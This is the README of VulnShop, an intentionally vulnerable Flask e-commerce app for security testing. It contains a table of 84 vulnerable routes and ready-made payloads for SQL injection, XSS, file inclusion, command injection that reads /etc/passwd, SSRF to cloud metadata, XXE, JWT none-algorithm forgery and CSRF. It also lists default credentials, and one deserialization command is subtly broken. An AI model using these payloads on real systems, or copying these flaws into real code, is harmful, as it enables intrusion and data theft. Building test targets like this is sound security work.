# VulnShop - Deliberately Vulnerable E-Commerce Application

**⚠️ WARNING:** This application is intentionally vulnerable and should only be used for local security testing. Never deploy this in a production environment.

VulnShop is a deliberately vulnerable Python Flask e-commerce web application designed for comprehensive security testing and vulnerability scanner benchmarking. It features a high-fidelity "Amazon-style" UI and **84 distinct security vulnerabilities** covering the full spectrum of modern web and cloud security.

## ✨ Key Features

- **84 Security Vulnerabilities**: Spanning OWASP Top 10 (2021), API Security Top 10 (2023), Business Logic, Cloud Infrastructure, and more.
- **Premium UI/UX**: Realistic e-commerce experience with product categories, search, checkout, and admin dashboards.
- **Microservices Ready**: Includes a `docker-compose` setup for Phase 8 testing (API Gateway, Auth Service, etc.).
- **Stability Optimized**: Recent May 2026 audit resolved logic bugs and resource leaks (DB connection management) for reliable automated scanning.

## 🚀 Quick Start

```bash
# Reset database and start the app
python database.py
python app.py
```

Access the site at http://localhost:5000

## Default Credentials

| Username | Password   | Email                |
|----------|------------|----------------------|
| admin    | admin123   | admin@vulnshop.com   |
| testuser | password123| test@vulnshop.com    |

## Vulnerability Reference

| #  | Route                    | Method | Vulnerability                  | Scanner Module      | Trigger Condition                                                              |
|----|--------------------------|--------|--------------------------------|---------------------|--------------------------------------------------------------------------------|
| 1  | `/product?id=`           | GET    | SQL Injection                  | sql_injection       | `?id=1' OR '1'='1` or `?id=1; SLEEP(5)--`                                      |
| 2  | `/search?q=`             | GET    | XSS (Reflected)                | xss_reflected       | `?q=<script>alert('XSS')</script>`                                            |
| 3  | `/support?file=`         | GET    | LFI (Local File Inclusion)     | lfi                 | `?file=../../../../etc/passwd`                                                 |
| 4  | `/run-diagnostic?input=`  | GET    | Command Injection              | command_injection   | `?input=;cat /etc/passwd` or `?input=|cat /etc/passwd`                          |
| 5  | `/track-order?url=`      | GET    | SSRF (Server-Side Request Forgery) | ssrf          | `?url=http://169.254.169.254/latest/meta-data/`                                 |
| 6  | `/template?name=`        | GET    | SSTI (Server-Side Template Injection) | ssti         | `?name={{7*7}}` (returns 49)                                                    |
| 7  | `/api/xml-import`        | POST   | XXE (XML External Entity)      | xxe                 | POST body: `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>` |
| 8  | `/jwt-login`             | GET    | JWT None Algorithm             | jwt_none            | Get token, then use with `alg:none` header                                      |
| 9  | `/checkout`              | POST   | CSRF (Cross-Site Request Forgery) | csrf           | POST with empty `csrfmiddlewaretoken` field                                     |
| 10 | `/upload-review`         | POST   | Unrestricted File Upload         | file_upload         | Upload any file extension (`.php`, `.jsp`, `.asp`, `.aspx`)                   |
| 11 | `/buy-ticket`            | POST   | Race Condition                 | race_condition      | Send 50+ concurrent POST requests to exhaust counter                           |
| 12 | `/api/products`          | GET    | Missing Security Headers       | headers_scan        | Check response headers for missing CSP, HSTS, X-Frame-Options, etc.             |
| 13 | `/files/`                | GET    | Directory Listing              | directory_listing   | Access `/files/` to see uploaded files listing                                  |
| 14 | `/api/options`           | OPTIONS| Dangerous HTTP Methods         | http_methods        | Check `Allow` header for TRACE method                                           |
| 15 | `/admin`                 | GET    | Admin Panel Exposed            | admin_exposure      | No authentication required - returns full admin dashboard                         |
| 16 | `/manager`               | GET    | Hidden Admin Path              | admin_exposure      | No authentication required - returns management console                         |
| 17 | `/administrator`         | GET    | Hidden Admin Path              | admin_exposure      | No authentication required - returns advanced configuration panel               |
| 18 | `/api/info`              | GET    | Vulnerable Components Info     | component_scan      | Returns vulnerable component information                                       |
| 19 | `/api/process`           | POST   | Insecure Deserialization       | deserialization     | Deserializes user input without validation                                      |
| 20 | `/api/login-audit`       | POST   | No Security Logging            | audit_failure       | Does not log failed login attempts                                             |
| 21 | `/api/v1/orders/<id>`    | GET    | BOLA/IDOR (API1:2023)          | api_idor            | Access any order without authorization                                         |
| 22 | `/api/v1/users/<id>/profile` | GET | BOLA/IDOR (API1:2023)          | api_idor            | Access any user profile without authorization                                    |
| 23 | `/api/v1/auth/refresh`   | POST   | Broken Auth (API2:2023)        | api_auth            | Refresh tokens never expire                                                   |
| 24 | `/api/v1/auth/password-reset` | POST | Broken Auth (API2:2023)        | api_auth            | Predictable reset tokens, no rate limiting                                     |
| 25 | `/api/v1/users/me`       | PUT    | Mass Assignment (API3:2023)    | api_mass_assignment | Accepts arbitrary fields including role                                       |
| 26 | `/api/v1/products/export` | GET    | Resource Consumption (API4:2023) | api_dos             | No pagination limits, can export 1M+ records                                  |
| 27 | `/api/v1/admin/users`    | GET    | Function Auth (API5:2023)      | api_bfla            | Admin endpoint with only signature check                                       |
| 28 | `/api/v1/cart/apply-coupon` | POST | Business Flow (API6:2023)      | api_business        | Unlimited coupon reuse                                                      |
| 29 | `/api/v1/products/import` | POST   | SSRF (API7:2023)               | api_ssrf            | URL-based import without validation                                           |
| 30 | `/api/v1/debug`          | GET    | Misconfiguration (API8:2023)    | api_misconfig       | Exposes secrets and environment                                              |
| 31 | `/api/v2/`               | GET    | Inventory Mgmt (API9:2023)     | api_inventory       | Deprecated API still accessible                                             |
| 32 | `/api/v1/payment/process` | POST   | Unsafe API (API10:2023)        | api_unsafe          | No validation of payment data                                                |
| 33 | `/api/v1/checkout/apply-discount` | POST | Payment Manipulation     | business_logic      | Stack unlimited discounts, negative prices                                     |
| 34 | `/api/v1/cart/update-price` | POST   | Price Manipulation           | business_logic      | Client-side price accepted without verification                              |
| 35 | `/api/v1/wallet/add-funds` | POST   | Race Condition               | race_condition      | Concurrent requests can double funds                                           |
| 36 | `/api/v1/orders/modify`   | POST   | Order Status Manipulation    | business_logic      | Can modify shipped orders                                                      |
| 37 | `/api/v1/orders/cancel`   | POST   | Order Cancellation Abuse    | business_logic      | Cancel other users' orders, double refunds                                    |
| 38 | `/api/v1/returns/process` | POST   | Double Refund Attack          | business_logic      | No check for previous returns                                                  |
| 39 | `/api/v1/cart/add`        | POST   | Negative Quantity            | business_logic      | Negative quantity = store credit                                               |
| 40 | `/api/v1/products/reserve` | POST   | Reservation Without Payment | business_logic      | Reserve items without payment auth                                            |
| 41 | `/api/v1/wishlist/share`  | GET    | Wishlist Enumeration         | business_logic      | Private wishlists accessible via ID                                            |
| 42 | `/api/v1/flash-sale`      | POST   | Race Condition (Inventory)  | race_condition      | Oversell limited stock via race condition                                    |
| 43 | `/api/v1/preorder`        | POST   | Preorder Abuse               | business_logic      | Preorder without payment guarantee                                           |
| 44 | `/api/v1/subscriptions/trial` | POST | Infinite Trial Loophole     | business_logic      | Unlimited free trials via device ID rotation                                   |
| 45 | `/api/v2/products/search` | POST   | NoSQL Injection               | nosql_injection     | MongoDB operators ($ne, $regex) in JSON                                      |
| 46 | `/api/v1/auth/ldap-login` | POST   | LDAP Injection               | ldap_injection      | Query manipulation for auth bypass                                            |
| 47 | `/api/v1/products/xml-search` | POST | XPath Injection            | xpath_injection     | XPath expression manipulation                                                 |
| 48 | `/api/v1/orders/filter` | POST   | ORM Injection                | orm_injection       | ORDER BY clause injection                                                     |
| 49 | `/api/v1/template/render` | POST   | Expression Language Injection | el_injection       | Template injection via user-controlled templates                              |
| 50 | `/api/v1/parse/json`     | POST   | Command Injection             | command_injection   | Shell metacharacters in JSON parsing                                          |
| 51 | `/api/v1/storage/upload` | POST   | S3 Misconfiguration          | cloud_misconfig     | Public read/write ACL on S3 bucket                                            |
| 52 | `/api/v1/storage/list`   | GET    | S3 Bucket Enumeration        | cloud_enum          | List S3 contents without authentication                                       |
| 53 | `/api/v1/admin/assume-role` | POST | IAM Privilege Escalation     | cloud_iam           | Assume any role without MFA validation                                        |
| 54 | `/api/v1/iam/policies`   | GET    | IAM Policy Enumeration       | cloud_enum          | List all IAM policies, roles, users                                           |
| 55 | `/api/v1/docker/run`     | POST   | Container Privilege Escalation | container_escape    | Privileged containers with host mount                                         |
| 56 | `/api/v1/container/exec` | POST   | Container Command Exec       | container_rce       | Execute arbitrary commands in containers                                      |
| 57 | `/api/v1/k8s/pods`       | GET    | K8s API Exposure             | k8s_exposure        | Unauthenticated access to pod information                                     |
| 58 | `/api/v1/k8s/secrets`    | GET    | K8s Secrets Exposure         | k8s_secrets         | Exposed Kubernetes secrets                                                      |
| 59 | `/api/v1/secrets/get`    | GET    | Secrets Management Failure     | secrets_leak        | Unrestricted access to all cloud secrets                                      |
| 60 | `/api/v1/environment`    | GET    | Environment Variable Leak    | info_disclosure     | Exposes all environment variables with credentials                              |
| 61 | `/api/v1/ci/build-trigger` | POST | CI/CD Command Injection      | cicd_rce            | Arbitrary command execution in build pipeline                                 |
| 62 | `/api/v1/deploy/status`  | GET    | Infrastructure Disclosure    | info_disclosure     | Reveals internal infrastructure details                                       |
| 63 | `/api/v1/git/repo`       | GET    | Git Repository Exposure      | info_disclosure     | Exposes git history with secrets in commits                                   |
| 64 | `/graphql`               | POST   | GraphQL Introspection        | graphql_info        | Schema introspection enabled - reveals all types                             |
| 65 | `/graphql/batch`         | POST   | GraphQL Batching            | graphql_dos         | Query batching bypasses rate limits                                          |
| 66 | `/graphql/search`        | POST   | GraphQL SQL Injection       | graphql_sql         | SQL injection via GraphQL variables                                          |
| 67 | `/api/v1/mobile/sync`    | POST   | Insecure Mobile Storage      | mobile_storage      | Unencrypted sensitive data on device                                         |
| 68 | `/api/v1/mobile/config`  | GET    | Insecure Mobile Comms        | mobile_network      | HTTP instead of HTTPS, weak ciphers                                            |
| 69 | `/api/v1/mobile/app-config` | GET | Hardcoded Credentials        | mobile_secrets      | API keys in mobile app binary                                                  |
| 70 | `/api/v1/mobile/check-device` | POST | Device Integrity Bypass     | mobile_integrity    | Client-side root detection bypass                                            |
| 71 | `/ws/chat`               | WS     | WebSocket No Auth            | ws_auth             | Unauthenticated WebSocket chat                                               |
| 72 | `/ws/notifications`      | WS     | WebSocket DoS/Flood          | ws_dos              | No rate limiting on WebSocket messages                                       |
| 73 | `/api/v1/ws/config`      | GET    | WebSocket CSWSH              | ws_csrf             | Cross-Site WebSocket Hijacking (no origin check)                            |
| 74 | `/api/v1/ws/status`      | GET    | WebSocket Info Disclosure    | ws_info             | Exposes WebSocket state and message history                                  |
| 75 | `/api/v1/crypto/encrypt` | POST   | DES Encryption               | crypto_weak         | Broken DES algorithm                                                         |
| 76 | `/api/v1/crypto/encrypt-aes` | POST | AES-ECB Mode               | crypto_ecb          | ECB mode leaks plaintext patterns                                            |
| 77 | `/api/v1/crypto/encrypt-cbc` | POST | Static IV                  | crypto_iv           | Reused IV allows attack detection                                            |
| 78 | `/api/v1/crypto/generate-key` | POST | Predictable Keys           | crypto_key          | MD5 key derivation with fixed salt                                           |
| 79 | `/api/v1/crypto/hash`    | POST   | Weak Hashing                 | crypto_hash         | MD5/SHA1 collision vulnerable                                                |
| 80 | `/api/v1/crypto/config`  | GET    | Hardcoded Keys               | crypto_leak         | Exposed encryption keys                                                        |
| 81 | `/api/v1/proxy/fetch`   | POST   | SSRF Internal Scanning       | ssrf_scan           | Internal port/network scanning                                               |
| 82 | `/api/v1/cloud/metadata` | GET    | Cloud Metadata Info          | ssrf_cloud          | Exposes metadata endpoint URLs                                               |
| 83 | `/api/v1/dns/lookup`    | POST   | DNS Rebinding                | ssrf_dns            | No DNS rebinding protection                                                    |
| 84 | `/api/v1/webhook/blind-ssrf` | POST | Blind SSRF                | ssrf_blind          | Out-of-band SSRF detection                                                     |

## Testing Payloads

### 1. SQL Injection - /product?id=
```
/product?id=1' OR '1'='1
/product?id=1 AND 1=1
/product?id=1 AND 1=2
/product?id=1' UNION SELECT * FROM users--
/product?id=1; SLEEP(5)--
```

### 2. XSS - /search?q=
```
/search?q=<script>alert('VulnScout_XSS_Test')</script>
/search?q=<img src=x onerror=alert('XSS')>
```

### 3. LFI - /support?file=
```
/support?file=../../../../etc/passwd
/support?file=..\..\..\windows\win.ini
```

### 4. Command Injection - /run-diagnostic?input=
```
/run-diagnostic?input=;cat /etc/passwd
/run-diagnostic?input=|cat /etc/passwd
/run-diagnostic?input=`sleep 5`
/run-diagnostic?input=127.0.0.1;sleep 5
```

### 5. SSRF - /track-order?url=
```
/track-order?url=http://169.254.169.254/latest/meta-data/
/track-order?url=http://127.0.0.1:22
```

### 6. SSTI - /template?name=
```
/template?name={{7*7}}
/template?name=${7*7}
/template?name=<% 7*7 %>
```

### 7. XXE - /api/xml-import (POST)
```bash
curl -X POST http://localhost:5000/api/xml-import \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
```

### 8. JWT None Algorithm
```bash
# Get token
curl http://localhost:5000/jwt-login

# Access protected route with none algorithm
curl http://localhost:5000/jwt-protected \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
```

### 9. CSRF - /checkout
```html
<form action="http://localhost:5000/checkout" method="POST">
  <input type="hidden" name="csrfmiddlewaretoken" value="">
  <input type="hidden" name="name" value="Attacker">
  <input type="hidden" name="card" value="1234567890123456">
  <input type="submit" value="Submit">
</form>
```

### 10. File Upload - /upload-review
Upload files with extensions: `.php`, `.phtml`, `.php5`, `.jsp`, `.asp`, `.aspx`
```php
<?php echo "VulnScout_Upload_Test"; ?>
```

### 11. Race Condition - /buy-ticket
Send 50+ concurrent POST requests to `/buy-ticket` without ticket count protection.

### 12. Security Headers Check - /api/products
```bash
curl -I http://localhost:5000/api/products
# Look for: Access-Control-Allow-Origin: *
# Missing: Strict-Transport-Security, CSP, X-Frame-Options, etc.
```

### 13. Directory Listing - /files/
```
http://localhost:5000/files/
```

### 14. HTTP Methods - /api/options
```bash
curl -X OPTIONS http://localhost:5000/api/options
# Look for: Allow: GET, POST, PUT, DELETE, TRACE
```

### 15-17. Admin Panels
```
http://localhost:5000/admin
http://localhost:5000/manager
http://localhost:5000/administrator
```

### 18. Vulnerable Components - /api/info
```bash
curl http://localhost:5000/api/info
# Exposes: Flask 2.0.1, Python 3.8.0, PyYAML 5.1 (CVE-2019-11324)
```

### 19. Insecure Deserialization - /api/process
```bash
# Python payload to generate malicious pickle
curl -X POST http://localhost:5000/api/process \
  -d "data=$(python3 -c 'import pickle, base64; print(base64.b6464(pickle.dumps({"a": 1})).decode())')"
```

### 20. No Security Logging - /api/login-audit
```bash
# Brute force attack - no logging, no rate limiting
curl -X POST http://localhost:5000/api/login-audit -d "username=admin&password=guess1"
curl -X POST http://localhost:5000/api/login-audit -d "username=admin&password=guess2"
# Check server logs - no failed login attempts recorded
```

## OWASP Top 10 (2021) Mapping

| OWASP ID | Category | Routes | Test Cases |
|----------|----------|--------|------------|
| **A01** | Broken Access Control | `/admin`, `/manager`, `/administrator`, `/dashboard`, `/files/` | Exposed panels, IDOR, directory traversal |
| **A02** | Cryptographic Failures | `/jwt-login`, `/jwt-protected`, `/login` | JWT None alg, plaintext passwords |
| **A03** | Injection | `/product`, `/search`, `/support`, `/run-diagnostic`, `/template`, `/api/xml-import` | SQLi, XSS, Command, SSTI, XXE |
| **A04** | Insecure Design | `/buy-ticket`, `/checkout` | Race condition, CSRF, hardcoded secrets |
| **A05** | Security Misconfiguration | `/api/products`, `/api/options`, `/` | Missing headers, debug mode, dangerous methods |
| **A06** | Vulnerable Components | `/api/info` | Exposed versions, known CVEs |
| **A07** | Auth Failures | `/login`, `/dashboard`, `/api/login-audit` | Weak session, brute force, no MFA |
| **A08** | Integrity Failures | `/api/process` | Insecure deserialization, no verification |
| **A09** | Logging Failures | `/api/login-audit` | No audit trail, no monitoring |
| **A10** | SSRF | `/track-order` | Server-side request forgery |

## Project Structure

```
vulnshop/
├── app.py              # Flask application with all vulnerable routes (inline templates)
├── database.py         # SQLite database initialization and seeding
├── requirements.txt    # Python dependencies
├── shopzone.db         # SQLite database (created on startup)
├── uploads/            # Uploaded files directory
└── README.md           # This file
```

## Database Schema

### Tables
- **users** - User accounts (id, username, email, password in plaintext)
- **products** - Product catalog (id, name, description, price, category, image_url, rating, reviews)
- **orders** - Order records (id, user_id, product_id, quantity, status)

## Authentication Flow

1. `/register` - Create new account (plaintext passwords stored)
2. `/login` - Authenticate and set session cookie
3. `/dashboard` - View user dashboard (weak session validation)
4. `/logout` - Clear session

## Known Issues Fixed

### FIX 1 - /manager and /administrator Styling
Both routes previously returned raw unstyled HTML. Now wrapped in `get_base_template()` with Amazon-style dark theme:
- `/manager` - Manager Console with sidebar links and system status table (CPU 23%, Memory 61%, Uptime 14d)
- `/administrator` - Administrator Panel with advanced configuration settings

### FIX 2 - /template?name= Styling
Previously had minimal styling. Now displays a styled "Personalized Welcome" card with VulnShop branding. SSTI vulnerability remains intact.

### FIX 3 - Cart Badge Session-Based
Previously hardcoded to "2". Now uses `session['cart_count']` with:
- POST `/cart/add` route to increment counter
- Default to 0 if not set
- Badge displays current session count

### FIX 4 - Dead Template Files Cleanup
Deleted all unused template files from `templates/` folder:
- base.html, index.html, product.html, search.html, login.html, register.html, dashboard.html, checkout.html, admin.html, upload.html

All rendering remains inline via `render_template_string()`.

### FIX 5 - Admin Revenue Calculation
Previously hardcoded "$12,450". Now calculated dynamically:
```sql
SELECT SUM(p.price * o.quantity) FROM orders o JOIN products p ON o.product_id = p.id
```

### FIX 6 - Prime Member Badge Logic
Previously always showed "Prime Member". Now:
- User id=1 (admin) shows "Prime Member" (blue badge)
- All other users show "Standard Member" (grey badge)

## Notes for Security Testing

- All passwords are stored in plaintext (intentionally vulnerable)
- Session validation is intentionally weak
- CSRF tokens are generated but not validated
- File uploads accept dangerous extensions
- SQL queries use string concatenation (no parameterization)
- User input is rendered directly into HTML (XSS)
- External entities are processed in XML (XXE)
- JWT tokens accept "none" algorithm
- Commands are executed via shell (command injection)
- No rate limiting or account lockout

## Microservices Architecture (Phase 8)

VulnShop now supports a microservices architecture for testing container and cloud-native vulnerabilities.

### Architecture Overview

```
┌─────────────────┐
│  API Gateway    │  ← Port 8080 (SSRF, IDOR, Info Disclosure)
│  (Vulnerable)     │
└────────┬────────┘
         │
    ┌────┴────┐
    │         │
┌───▼───┐ ┌──▼────┐ ┌───────┐ ┌─────────┐
│ Auth  │ │Product│ │ Order │ │ Payment │
│:5001  │ │:5002  │ │:5003  │ │ :5004   │
└───────┘ └───────┘ └───────┘ └─────────┘
                                              
┌─────────┐ ┌─────────┐ ┌─────────┐
│  Admin  │ │Metadata │ │  Redis  │
│ :9090   │ │ :8081   │ │ :6379   │
│ (No Auth)│ │ (AWS)   │ │(No Auth)│
└─────────┘ └─────────┘ └─────────┘
```

### Services & Vulnerabilities

| Service | Port | Vulnerabilities |
|---------|------|-----------------|
| **API Gateway** | 8080 | SSRF, internal route exposure, verbose errors |
| **Auth Service** | 5001 | SQL Injection, JWT None algorithm, weak secrets |
| **Product Service** | 5002 | SQL Injection, mass assignment, race conditions |
| **Order Service** | 5003 | Price manipulation, IDOR, business logic flaws |
| **Payment Service** | 5004 | Credit card logging, double refund, no PCI |
| **Admin Panel** | 9090 | No authentication, RCE, full internal access |
| **Metadata Service** | 8081 | AWS metadata simulation (SSRF target) |
| **Redis** | 6379 | No authentication, exposed internal |
| **PostgreSQL** | 5432 | Weak credentials, exposed for SSRF |

### Running Microservices

```bash
# Start all services
docker-compose up -d

# Access points:
# - API Gateway: http://localhost:8080
# - Admin Panel: http://localhost:9090 (no auth!)
# - Auth Service: http://localhost:5001
# - Metadata (SSRF target): http://localhost:8081
```

### Inter-Service Vulnerabilities

1. **SSRF Chain**: API Gateway → Internal Services → Metadata → Cloud credentials
2. **Lateral Movement**: Compromised Auth → Order Service → Payment Service
3. **Container Escape**: Privileged containers, mounted docker.sock
4. **Network Scanning**: Exposed internal ports via proxy endpoints

## Statistics

- **Total Vulnerabilities**: 84
- **Phases Implemented**: 8
- **Lines of Code**: 3,535
- **Categories Covered**:
  - OWASP Top 10 (2021)
  - OWASP API Security Top 10 (2023)
  - Business Logic Flaws
  - Advanced Injection
  - Cloud & Infrastructure
  - Cryptographic Weaknesses
  - Microservices/Container

## License

This is a testing application for educational purposes only.
